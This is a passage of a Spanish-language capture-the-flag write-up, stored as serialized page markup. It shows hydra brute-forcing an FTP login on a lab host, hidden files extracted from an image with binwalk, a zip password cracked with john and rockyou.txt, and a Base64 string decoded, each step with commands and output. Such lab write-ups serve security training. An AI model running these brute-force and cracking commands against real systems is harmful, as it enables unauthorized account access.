10.10.195.209"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" ftp\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicación del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"hydra:"}]},{"type":"text","value":" "},{"type":"element","tag":"i","props":{},"children":[{"type":"text","value":"Cracker"}]},{"type":"text","value":" de inicios de sesión paralelos que soporta numerosos protocolos."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-l [usuario]:"}]},{"type":"text","value":" Nombre de usuario a iniciar sesión."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-P: [lista de palabras]"}]},{"type":"text","value":" Ruta del archivo con contraseñas a probar."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-f:"}]},{"type":"text","value":" Parar después del primer inicio de sesión valido."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-vV:"}]},{"type":"text","value":" Salida muy verbal."}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"hydra -l \"chris\" -P /usr/share/wordlists/rockyou.txt -f -vV 10.10.195.209 ftp\n\n[...]\n[21][ftp] host: 10.10.195.209   login: chris   password: crystal\n[STATUS] attack finished for 10.10.195.209 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-30 20:05:43\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"hydra -l \"chris\" -P /usr/share/wordlists/rockyou.txt -f -vV 10.10.195.209 ftp\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[...]\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[21][ftp] host: 10.10.195.209   login: chris   password: crystal\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[STATUS] attack finished for 10.10.195.209 (valid pair found)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"1 of 1 target successfully completed, 1 valid password found\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-30 20:05:43\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Obtenemos la contraseña "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"crystal"}]},{"type":"text","value":". Ingresamos al servidor "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"FTP"}]},{"type":"text","value":" con estas credenciales y listamos los archivos."}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"ftp> ls\n229 Entering Extended Passive Mode (|||6987|)\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt\n-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg\n-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png\n226 Directory send OK.\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"ftp> ls\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"229 Entering Extended Passive Mode (|||6987|)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"150 Here comes the directory listing.\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"226 Directory send OK.\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"El servidor "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"FTP"}]},{"type":"text","value":" contiene tres archivos: Dos imágenes y un archivo de texto. Los descargamos de forma recursiva."}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"ftp> prompt\nInteractive mode off.\nftp> mget .\nlocal: To_agentJ.txt remote: To_agentJ.txt\n[...]\nlocal: cute-alien.jpg remote: cute-alien.jpg\n[...]\nlocal: cutie.png remote: cutie.png\n[...]\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"ftp> prompt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Interactive mode off.\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"ftp> mget .\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"local: To_agentJ.txt remote: To_agentJ.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[...]\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"local: cute-alien.jpg remote: cute-alien.jpg\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[...]\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"local: cutie.png remote: cutie.png\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":9},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[...]\n"}]}]}]}]},{"type":"element","tag":"blockquote","props":{},"children":[{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Usamos el comando "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"promt"}]},{"type":"text","value":" para evitar tener que confirmar manualmente la descarga de cada archivo."}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"A simple vista, no hay nada fuera de lo usual en las imágenes descargadas. El archivo "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"To_agentJ.txt"}]},{"type":"text","value":" contiene el siguiente mensaje."}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"Dear agent J,\n\nAll these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.\n\nFrom,\nAgent C\n","filename":"To_agentJ.txt","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Dear agent J,\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"From,\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Agent C\n"}]}]}]}]},{"type":"element","tag":"h3","props":{"id":"esteganografía"},"children":[{"type":"text","value":"Esteganografía"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Según el mensaje anterior, una de las imágenes contiene la contraseña de Agent R. Debemos realizar estegoanálisis en busca de un mensaje escondido. Podemos realizar este proceso con muchas herramientas, pero en CTFs usualmente podremos obtener información oculta haciendo uso de "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"exiftool"}]},{"type":"text","value":", "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"strings"}]},{"type":"text","value":", "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"binwalk"}]},{"type":"text","value":" y "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"steghide"}]},{"type":"text","value":" (no esperes hacer uso de estas herramientas en pruebas de penetración reales)."}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"La herramienta "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"exiftool"}]},{"type":"text","value":" no revela nada importante en ambas imágenes. Pero "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"strings"}]},{"type":"text","value":" revela algo en la imagen "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"cutie.png"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"strings cutie.png | head -n 20 && echo \".....\" && strings cutie.png | tail -n 20\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"strings"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" cutie.png"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#F97583"},"children":[{"type":"text","value":" |"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":" head"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -n"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" 20"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#E1E4E8"},"children":[{"type":"text","value":" && "}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":"echo"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" \".....\""}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#E1E4E8"},"children":[{"type":"text","value":" && "}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"strings"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" cutie.png"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#F97583"},"children":[{"type":"text","value":" |"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":" tail"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -n"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" 20\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicación del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"strings:"}]},{"type":"text","value":" Mostrar cadenas de texto legibles para humanos."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"head:"}]},{"type":"text","value":" Mostrar las primeras 10 lineas de un archivo."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-n [numero]:"}]},{"type":"text","value":" Mostrar las primeras lineas."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"tail:"}]},{"type":"text","value":" Mostrar las ultimas 10 lineas de un archivo."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-n [numero]:"}]},{"type":"text","value":" Mostrar las ultimas lineas."}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"strings cutie.png | head -n 20 && echo \".....\" && strings cutie.png | tail -n 20\n\n[...]\nTo_agentR.txt\nW\\_z#\n2a>=\nTo_agentR.txt\nEwwT\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"strings cutie.png | head -n 20 && echo \".....\" && strings cutie.png | tail -n 20\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[...]\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"To_agentR.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"W\\_z#\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"2a>=\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"To_agentR.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"EwwT\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Descubrimos que "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"cutie.png"}]},{"type":"text","value":" contiene un archivo de texto incrustado. Para extraerlo hacemos uso de "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"binwalk"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"binwalk -e cutie.png\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"binwalk"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" -e"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" cutie.png\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicación del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"binwalk:"}]},{"type":"text","value":" Buscar archivos incrustados en binarios."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"-e:"}]},{"type":"text","value":" Extraer automáticamente tipos de archivos conocidos (requiere de las herramientas adecuadas instaladas)."}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"binwalk -e cutie.png\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n869           0x365           Zlib compressed data, best compression\n\nWARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly\n34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt\n\nWARNING: One or more files failed to extract: either no utility was found or it's unimplemented\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"binwalk -e cutie.png\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"DECIMAL       HEXADECIMAL     DESCRIPTION\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"--------------------------------------------------------------------------------\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"869           0x365           Zlib compressed data, best compression\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":8},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":9},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":10},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"WARNING: One or more files failed to extract: either no utility was found or it's unimplemented\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Los archivos fueron extraídos en la carpeta "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"_cutie.png.extracted"}]},{"type":"text","value":". Dentro de esta carpeta encontramos el archivo "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"8702.zip"}]},{"type":"text","value":" que no pudo ser extraído automáticamente. Sin embargo "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"unzip"}]},{"type":"text","value":" falla en extraer este archivo, por lo que debemos de usar "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"7zip"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"7zip x 8702.zip\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"7zip"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" x"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" 8702.zip\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicación del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"7zip:"}]},{"type":"text","value":" Software para comprimir y descomprimir archivos."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"x:"}]},{"type":"text","value":" Extraer archivo."}]}]}]},{"type":"element","tag":"h3","props":{"id":"crackeo-de-zip"},"children":[{"type":"text","value":"Crackeo de zip"}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"El archivo "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"8702.zip"}]},{"type":"text","value":" esta protegido por una contraseña. Para "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"crackearla"}]},{"type":"text","value":", primero debemos debemos de convertir el archivo ZIP en un formato adecuado para "},{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"john"}]},{"type":"text","value":" haciendo uso de "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"zip2john"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"zip2john 8702.zip > zip2john.txt\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"zip2john"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" 8702.zip"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#F97583"},"children":[{"type":"text","value":" >"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" zip2john.txt\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicación del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"zip2john [archivo]:"}]},{"type":"text","value":" Convertir archivo ZIP en un formato adecuado para "},{"type":"element","tag":"i","props":{},"children":[{"type":"text","value":"john"}]},{"type":"text","value":"."}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"element","tag":"em","props":{},"children":[{"type":"text","value":"Crackeamos"}]},{"type":"text","value":" la contraseña con "},{"type":"element","tag":"strong","props":{},"children":[{"type":"text","value":"john"}]},{"type":"text","value":" haciendo uso del archivo "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"zip2john.txt"}]},{"type":"text","value":" generado anteriormente y la lista de palabras "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"rockyou.txt"}]},{"type":"text","value":"."}]},{"type":"element","tag":"pre","props":{"className":"language-bash shiki shiki-themes github-dark","code":"john --wordlist=/usr/share/wordlists/rockyou.txt zip2john.txt\n","language":"bash","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{"style":"--shiki-default:#B392F0"},"children":[{"type":"text","value":"john"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#79B8FF"},"children":[{"type":"text","value":" --wordlist=/usr/share/wordlists/rockyou.txt"}]},{"type":"element","tag":"span","props":{"style":"--shiki-default:#9ECBFF"},"children":[{"type":"text","value":" zip2john.txt\n"}]}]}]}]},{"type":"element","tag":"details","props":{},"children":[{"type":"element","tag":"summary","props":{},"children":[{"type":"text","value":"Explicación del comando"}]},{"type":"element","tag":"ul","props":{},"children":[{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"john:"}]},{"type":"text","value":" Recuperador de contraseñas."}]},{"type":"text","value":"\n        "},{"type":"element","tag":"li","props":{},"children":[{"type":"element","tag":"b","props":{},"children":[{"type":"text","value":"--wordlist [lista de palabras]:"}]},{"type":"text","value":" Lista de palabras a usar."}]}]}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"john --wordlist=/usr/share/wordlists/rockyou.txt zip2john.txt\n\n[...]\nalien            (8702.zip/To_agentR.txt)\n1g 0:00:00:00 DONE (2025-05-30 19:47) 1.351g/s 44281p/s 44281c/s 44281C/s christal..eatme1\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"john --wordlist=/usr/share/wordlists/rockyou.txt zip2john.txt\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"[...]\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"alien            (8702.zip/To_agentR.txt)\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"1g 0:00:00:00 DONE (2025-05-30 19:47) 1.351g/s 44281p/s 44281c/s 44281C/s christal..eatme1\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Use the \"--show\" option to display all of the cracked passwords reliably\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":7},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Session completed.\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"Encontramos que la contraseña para descomprimir el archivo es "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"alien"}]},{"type":"text","value":". Al descomprimir el archivo ZIP obtenemos el archivo de texto "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"To_agentR.txt"}]},{"type":"text","value":" el cual contiene el siguiente mensaje."}]},{"type":"element","tag":"pre","props":{"className":"language-text shiki shiki-themes github-dark","code":"Agent C,\n\nWe need to send the picture to 'QXJlYTUx' as soon as possible!\n\nBy,\nAgent R\n","filename":"_cutie.png.extracted/To_agentR.txt","language":"text","meta":"","style":""},"children":[{"type":"element","tag":"code","props":{"__ignoreMap":""},"children":[{"type":"element","tag":"span","props":{"class":"line","line":1},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Agent C,\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":2},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":3},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"We need to send the picture to 'QXJlYTUx' as soon as possible!\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":4},"children":[{"type":"element","tag":"span","props":{"emptyLinePlaceholder":true},"children":[{"type":"text","value":"\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":5},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"By,\n"}]}]},{"type":"element","tag":"span","props":{"class":"line","line":6},"children":[{"type":"element","tag":"span","props":{},"children":[{"type":"text","value":"Agent R\n"}]}]}]}]},{"type":"element","tag":"p","props":{},"children":[{"type":"text","value":"A simple vista esto no parece sernos de utilidad, pero la cadena de texto "},{"type":"element","tag":"code","props":{"className":[]},"children":[{"type":"text","value":"QXJlYTUx"}]},{"type":"text","value":" puede estar codificada. Ingresamos esta cadena de texto en "},{"type":"element","tag":"a","props":{"href":"https://cyberchef.io/","rel":["nofollow"]},"children":[{"type":"text","value":"CyberChef"}]},{"type":"text","value":". La pagina automáticamente reconoce que esta cadena de texto esta codificada en Base64. Al decodificarla obtenemos la frase 